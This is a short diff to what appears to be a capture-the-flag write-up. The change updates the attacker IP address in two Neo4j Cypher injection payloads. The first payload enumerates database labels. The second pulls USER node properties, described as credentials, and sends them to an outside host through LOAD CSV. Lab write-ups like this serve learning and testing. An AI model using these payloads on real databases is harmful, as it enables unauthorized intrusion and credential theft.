@@ -169,14 +169,14 @@ Results show that Neo4j 5.24.1 (Community Edition) is in use.
 
 Next, we enumerate labels (equivalent to tables in SQL):
 ```bash
-' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.144:9000/?'+label AS b RETURN b//
+' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.9:9000/?'+label AS b RETURN b//
 ```
 
 Finds an interesting label: USER.
 
 We then extract credentials:
 ```bash
-' OR 1=1 WITH 1 as a MATCH (f:USER) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.144:9000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+' OR 1=1 WITH 1 as a MATCH (f:USER) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.9:9000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
 
 ```bash
